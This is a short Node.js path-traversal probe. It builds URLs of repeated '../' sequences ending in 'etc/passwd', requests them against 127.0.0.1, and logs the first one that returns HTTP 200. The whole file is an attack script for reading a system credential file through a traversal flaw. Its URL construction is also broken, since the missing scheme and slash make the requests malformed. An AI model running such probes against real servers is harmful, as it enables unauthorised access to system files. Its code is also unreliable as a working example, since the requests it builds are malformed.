const http = require('http');

const url = "127.0.0.1";
const payload = "../";
let success_url = [];

async function test() {
    for (let i = 0; i < 10; i++) {
        let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
        const response = await new Promise(resolve => {
            http.request(victim_url, resolve).end();
        });
        const status = response.statusCode;

        console.log(status);

        if (status === 200) {
            success_url.push(victim_url);
            break;
        }
    }
    console.log(success_url);
}

test();
